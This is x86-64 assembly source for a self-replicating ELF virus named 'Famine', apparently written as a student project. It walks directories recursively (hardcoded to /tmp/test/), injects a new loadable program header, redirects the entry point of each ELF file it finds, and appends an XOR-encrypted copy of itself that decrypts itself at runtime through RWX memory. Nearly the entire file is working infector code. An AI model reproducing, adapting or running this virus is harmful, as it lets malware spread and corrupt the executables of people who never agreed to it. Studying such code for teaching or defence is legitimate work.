%include "src/famine.inc"

BITS 64
default rel

section .text
	global _start

; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	call	_xor_decrypt
	PUSH_ALL
	jmp		end_


_xor_decrypt:
	push rsi
	push rdi
	push rcx
	push rdx
	push rbx
	push rax
	push r8
	push r9
	push r10

	; Calculate the actual size to decrypt
	lea rax, [rel end_addr]
	lea rcx, [rel _encrypted_start]
	sub rax, rcx
	mov r8, rax                    ; r8 = actual size to decrypt
	
	; Get page-aligned start address
	lea rsi, [rel _encrypted_start]
	mov rdi, rsi
	and rdi, ~0xFFF                ; Page align start (clear lower 12 bits)
	
	; Calculate total pages needed
	lea rax, [rel end_addr]
	sub rax, rdi                   ; Total span from page start to end
	add rax, 4095                  ; Round up to next page
	and rax, ~4095                 ; Clear lower 12 bits = page aligned size
	
	; Change memory protection
	mov r9, rax                    ; Save the page-aligned size
	mov rax, 10                    ; SYS_mprotect
	mov rsi, r9                    ; page-aligned size  
	mov rdx, 7                     ; PROT_READ|PROT_WRITE|PROT_EXEC
	syscall
	
	test rax, rax
	js .skip_decrypt               ; Skip if mprotect failed

	; Now decrypt - match the encryption algorithm exactly
	lea rsi, [rel _encrypted_start]
	mov rcx, r8                    ; Total size
	xor r10, r10                   ; r10 = byte counter (like 'i' in C)
	
	; Create key bytes lookup
	mov rbx, 0xdeadbeefdeadbeef
	sub rsp, 8
	mov [rsp], rbx                 ; Store key on stack for byte access

.xor_loop:
	test rcx, rcx
	jz .done
	
	; Calculate key byte: k[i % 8]
	mov rax, r10
	and rax, 7                     ; rax = i % 8
	mov al, byte [rsp + rax]       ; al = k[i % 8]
	
	; XOR with current byte
	mov bl, byte [rsi]
	xor bl, al
	mov byte [rsi], bl
	
	inc rsi
	inc r10                        ; Increment byte counter
	dec rcx
	jmp .xor_loop

.done:
	add rsp, 8                     ; Restore stack
.skip_decrypt:
	pop r10
	pop r9
	pop r8
	pop rax
	pop rbx
	pop rdx
	pop rcx
	pop rdi
	pop rsi
	ret
_encrypted_start:

print_rax:

    PUSH_ALL
    ; Utilisation d’un buffer sur la pile
    sub     rsp, 64             ; réserver 32 bytes
    lea     rsi, [rsp + 64]     ; rsi = fin du buffer
    mov     rcx, 0              ; compteur de caractères
    mov     rbx, rax            ; backup rax dans rbx

.convert:
    xor     rdx, rdx
    mov     rax, rbx
    mov     rdi, 10
    div     rdi                ; rax = rbx / 10, rdx = reste
    dec     rsi
    add     dl, '0'
    mov     [rsi], dl
    mov     rbx, rax
    inc     rcx
    test    rax, rax
    jnz     .convert

    ; Affichage
    mov     rax, 1              ; syscall write
    mov     rdi, 1              ; stdout
    mov     rdx, rcx            ; taille
    syscall


	mov		rax, SYS_write
	mov		rdi, 1
	lea		rsi, [rel newl]
	mov		rdx, 1
	syscall

    add     rsp, 64             ; restaurer la pile
    POP_ALL
    ret

	;   rax = ((value - (base % 0x1000) + 0x0FFF) & ~0x0FFF) + (base % 0x1000)
	align_value:	; rax = value, rdx = base
		; sauvegarder base % 0x1000 dans rcx
		PUSH_ALLr
		and		rdx, 0xFFF        ; rcx = base % 0x1000
		sub		rax, rdx          ; rax = value - (base % 0x1000)
		add		rax, 0x0FFF       ; rax += 0x0FFF
		and		rax, ~0x0FFF      ; rax = align up to next page
		add		rax, rdx          ; rax += (base % 0x1000)
		POP_ALLr
	ret



	printf: ; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		xor		rdx, rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			sub		rsi, rdx
			mov		rax, SYS_write
			mov		rdi, 1
			syscall
			mov		rax, SYS_write
			mov		rdi, 1
			lea		rsi, [rel newl]
			mov		rdx, 1
			syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	sub_val:	; lea rsi
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		.loop:
			lodsb		; al <- [rsi], rsi++
			inc		rdx
			test	al, al
			je		.done
			jmp		.loop
		.done:
			cmp		rdx, 3
			jle		.finish
			std		 ; sens inverse pour lodsb
			mov		[rsi - 2], byte 0
			.second_loop:
				lodsb
				cmp		al, '/'
				je		.second_done
				mov		[rsi + 1], byte 0
				jmp		.second_loop
			.second_done:
			cld
		.finish:
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	add_val:	; lea rsi [le path], lea rdi val ajoutee
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx
		push	r12

		mov		r12, rax
		xor		rcx, rcx
		xor		rdx, rdx
		.loop:
			lodsb
			test	al, al
			je		.done
			inc		rdx
			jmp		.loop
		.done:
			dec		rsi
			xchg	rsi, rdi
			.second_loop:
				lodsb
				inc		rcx
				test	al, al
				je		.second_done
				jmp		.second_loop
			.second_done:
				sub		rsi, rcx
				mov		rax, rcx
				rep		movsb
				xchg	rsi, rdi

				cmp		r12, 4
				jne		.file
				mov		[rsi - 1], byte '/'
				mov		[rsi], byte 0
				.file:
				sub		rsi, rax
				sub		rsi, rdx
		pop		r12
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
	ret

	famine:
		push	r12
		push	rax
		push	rcx
		push	rsi
		push	rdi
		push	rdx

		lea		rsi, [rel path]
		call	printf
		lea		rdi, [rel buff]
		mov		rcx, 512
		xor		rax, rax
		rep		stosq

		mov		rax, SYS_openat
		mov		rdi, AT_FDCWD
		lea		rsi, [rel path]
		xor		rdx, rdx
		xor		r10, r10
		syscall
		mov		r12, rax
		mov		rdi, rax
		push	rdi

	;SYS_getdents64
	;struct linux_dirent64 {
    ;ino64_t        d_ino;     // 8 bytes : numéro d'inode
    ;off64_t        d_off;     // 8 bytes : offset du prochain dirent
    ;unsigned short d_reclen;  // 2 bytes : taille de cette entrée
    ;unsigned char  d_type;    // 1 byte  : type de fichier
    ;char           d_name[];  // nom du fichier (null-terminated)
	;};

		mov		rax, SYS_getdents64
		lea		rsi, [rel buff]
		mov		rdx, 4096
		syscall
		mov		rdx, rax
		xor		rdi, rdi
		.loop:
			cmp		rdx, rdi
			jle		.done

			add		rdi, 16
			push	rbx
			lea		rbx, [rel buff]
			movzx	rcx, word [rbx + rdi]
			add		rdi, 2
			movzx	rax, byte [rbx + rdi]
			pop		rbx
			add		rdi, 1
			sub		rcx, 19
			add		rdi, rcx
			add		rsi, 19

			cmp		rax, 4
			jne		.file
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 2
			lea		rdi, [rel curr]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			push	rsi
			push	rcx
			push	rdi
			mov		rcx, 3
			lea		rdi, [rel last]
			repe	cmpsb
			pop		rdi
			pop		rcx
			pop		rsi
			je		.no_print
			; Ici seulement les files


			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi


			call	famine

			push	rsi
			lea		rsi, [rel path]
			call	sub_val
			pop		rsi

			push	rax
			push	rcx
			push	rsi
			push	rdi
			push	rdx
			lea		rdi, [rel buff]
			mov		rcx, 512
			xor		rax, rax
			rep		stosq

			mov		rax, SYS_close
			mov		rdi, r12
			syscall

			mov		rax, SYS_openat
			mov		rdi, AT_FDCWD
			lea		rsi, [rel path]
			xor		rdx, rdx
			xor		r10, r10
			syscall

			mov		rdi, rax
			mov		rax, SYS_getdents64
			lea		rsi, [rel buff]
			mov		rdx, 4096
			syscall
			pop		rdx
			pop		rdi
			pop		rsi
			pop		rcx
			pop		rax

			jmp		.no_print
		.file:
			;call	printf ;logique des fichier




			push	rdi
			push	rsi
			push	rax
			lea		rdi, [rel path]
			xchg	rsi, rdi
			call	add_val
			pop		rax
			pop		rsi
			pop		rdi

			;call	printf

			call	infection_0






			; ici logique des fichier
		.no_print:
			add		rsi, rcx
			jmp		.loop
		.done:


		pop		rdi
		mov		rax, SYS_close
		syscall
		pop		rdx
		pop		rdi
		pop		rsi
		pop		rcx
		pop		rax
		pop		r12
	ret
		; elfp0
		;movzx	rcx, e_phnum
		;movzx	rdi, e_phentisize
	infection_0:
		PUSH_ALLr

		mov		BYTE [rel zero], 1
		mov		qword [rel p_offset], 0
		mov		qword [rel p_vaddr], 0
		mov		qword [rel p_paddr], 0


		mov		qword [rel p_offset],  0

		mov		r10, 64 ; offset in file!
		xor		r15, r15	; gap
		xor		r11, r11
		mov		r13, 1
	.loop:
		push	r11
		push	rcx
		mov		rax, SYS_read
		mov		rdi, r12
		lea		rsi, [rel elfp0]
		mov		rdx, 56
		syscall
		pop		rcx
		pop		r11
		add		r10, 56
		cmp		rax, 56
		jne		.return

		cmp		dword [rel elfp0], 1
		jne		.no_load

		mov		rax, [rel elfp0 + phdr.p_filesz]
		add		rax, [rel elfp0 + phdr.p_offset]
		cmp		rax,  [rel p_offset]
		jb		.no_above
		mov		[rel p_offset], rax
	.no_above_offset:
		mov		rax, [rel elfp0 + phdr.p_vaddr]
		add		rax, [rel elfp0 + phdr.p_memsz]
		cmp		rax,  [rel p_vaddr]
		jb		.no_above
		mov		[rel p_vaddr], rax
	.no_above:
		cmp		dword [rel elfp0 + phdr.p_flags], 6
		jnle	.no_load
		mov		r15, [rel elfp0 + phdr.p_vaddr]
		sub		r15, [rel elfp0 + phdr.p_offset]

	.no_load:
		cmp		dword [rel elfp0], 0
		je		.usseles_ph
		cmp		dword [rel elfp0], 4
		je		.usseles_ph
		cmp		dword [rel elfp0], 5
		je		.usseles_ph
		jmp		.not_usseles_ph
	.usseles_ph:
		mov		r11, r10
		xor		r13, r13
	.not_usseles_ph:
	dec	rcx
	jnz	.loop


		cmp		r13, 1
		je		.return
		mov		rax, [rel p_vaddr]
		;add		rax, [rel elfb + ehdr.e_shoff]
		;add		rax, r15	-> Tant que ca crash pas on add pas!


		mov		rdx, [rel p_offset]

		call	align_value

		mov		[rel p_vaddr], rax
		mov		[rel entry], rax
		mov		[rel p_paddr], rax

		sub		r11, 56;

		mov		rax, SYS_pwrite64
		mov		rdi, r12
		lea		rsi, [rel new_programheader]
		mov		rdx, 56
		mov		r10, r11
		syscall
		;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
		; New Entry
		mov		rax, SYS_pwrite64
		mov		rdi, r12
		lea		rsi, [rel p_vaddr]
		mov		rdx, 8
		mov		r10, ehdr.e_entry
		syscall


		mov		rax, SYS_pwrite64
		mov		rdi, r12
		lea		rsi, [rel one]
		mov		rdx, 1
		mov		r10, 0xa
		syscall

		; write famine

		; 15952 ->21088
		; write encrypted famine
		mov		rdi, r12
		mov		r10, [rel p_offset]
		call	_write_encrypted_payload
		test	rax, rax
		js		.return		; Jump if encryption/write failed
		; syscall

	.return:

		mov		rax, r13
		POP_ALLr
	ret


end_:
	; Check if we were infected (zero flag indicates original vs infected)
	mov		al, BYTE [rel zero]
	test	al, al
	jz		.original_execution
	
	; We are an infected file - calculate original entry point
	mov		rax, [rel old_entry]
	test	rax, rax
	jz		.exit_program		; No original entry, just exit
	mov		[rel new_entry], rax
	jmp		.continue
	
.original_execution:
	; We are the original famine - no need to jump anywhere
	xor		rax, rax
	mov		[rel new_entry], rax

.continue:

	call	famine

	mov		rax, SYS_open
	lea		rdi, [rel self]
	xor		rsi, rsi
	xor		rdx, rdx
	syscall
	cmp		rax, 0
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12
	lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall


	mov		rax, SYS_close
	mov		rdi, r12
	syscall

.just_quit:
	POP_ALL
	
	; Check if we need to jump to original entry point
	mov		rax, [rel new_entry]
	test	rax, rax
	jz		.exit_ret
	
	; Jump to original program
	jmp		rax

.exit_ret:
	mov		rax, SYS_exit
	xor		rdi, rdi
	syscall

.exit_program:
	mov		rax, SYS_exit
	xor		rdi, rdi
	syscall

_write_encrypted_payload:
    ; Input: rdi = file descriptor, r10 = write offset
    ; Returns: rax = 0 on success, negative on error
    
    PUSH_ALLr
    
    mov r12, rdi        ; save file descriptor
    mov r11, r10        ; save write offset
    
    ; Calculate payload size
    lea rax, [rel end_addr]
    lea rcx, [rel _encrypted_start]
    sub rax, rcx
    mov r8, rax         ; r8 = payload size
    
    ; Round up size to page boundary for mmap
    add rax, 4095
    and rax, ~4095
    mov r9, rax         ; r9 = aligned size
    
    ; mmap anonymous memory
    mov rax, 9          ; SYS_mmap
    xor rdi, rdi        ; addr = NULL
    mov rsi, r9         ; length = aligned size
    mov rdx, 3          ; prot = PROT_READ | PROT_WRITE
    mov r10, 0x22       ; flags = MAP_PRIVATE | MAP_ANONYMOUS
    mov r8, -1          ; fd = -1
    xor r9, r9          ; offset = 0
    syscall
    
    cmp rax, -1
    je .error
    
    mov rbx, rax        ; rbx = mapped memory
    
    ; Copy payload to mapped memory
    mov rdi, rbx                    ; destination
    lea rsi, [rel _encrypted_start] ; source
    mov rcx, r8                     ; size
    rep movsb
    
    ; Encrypt the copied payload
    mov rsi, rbx        ; start of mapped memory
    mov rcx, r8         ; payload size
    xor r10, r10        ; byte counter
    
    ; Use same key as decrypt
    mov rax, 0xdeadbeefdeadbeef
    push rax

.encrypt_loop:
    test rcx, rcx
    jz .encrypt_done
    
    ; Calculate key byte: k[i % 8]
    mov rax, r10
    and rax, 7
    mov al, byte [rsp + rax]
    
    ; XOR with current byte
    mov dl, byte [rsi]
    xor dl, al
    mov byte [rsi], dl
    
    inc rsi
    inc r10
    dec rcx
    jmp .encrypt_loop

.encrypt_done:
    add rsp, 8          ; remove key from stack
    
    ; Write encrypted payload to file
    mov rax, SYS_pwrite64
    mov rdi, r12        ; file descriptor
    mov rsi, rbx        ; encrypted payload
    mov rdx, r8         ; payload size
    mov r10, r11        ; write offset
    syscall
    
    push rax            ; save write result
    
    ; Unmap memory
    mov rax, 11         ; SYS_munmap
    mov rdi, rbx        ; address
    mov rsi, r9         ; aligned size
    syscall
    
    pop rax             ; restore write result
    
    ; Check if write was successful
    cmp rax, r8
    jne .error
    
    xor rax, rax        ; success
    jmp .done

.error:
    mov rax, -1

.done:
    POP_ALLr
    ret

; -----


	elfb	times 0064 db 0
	file	db 'elf64 found!', 0
	msg1	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
	old_entry		   dq 0
	new_entry		   dq 0
	self	db '/proc/self/exe', 0
	last	db '..', 0
	curr	db '.', 0
	elfh	db 0x7f, 'ELF'
	one		db 1
	zero	db 0
	paddi	dq 0
	entry	dq 0
	exec	dd 7

; NEW HEADER
new_programheader:
	p_type		dd	1
	p_flags		dd	7
	p_offset	dq	0
	p_vaddr		dq	0
	p_paddr		dq	0
	p_filez		dq	FAMINE_SIZE_NO_BSS
	p_memsz		dq	FAMINE_SIZE
	p_palign	dq	4096
	newl	times 0001 db 0xa
	path	db '/tmp/test/', 0
buffer_bss:
	padd	times 0512 db 0
	buff	times 4096 db 0
	elfp0	times 0056 db 0
	elfp1	times 0056 db 0

end_addr:
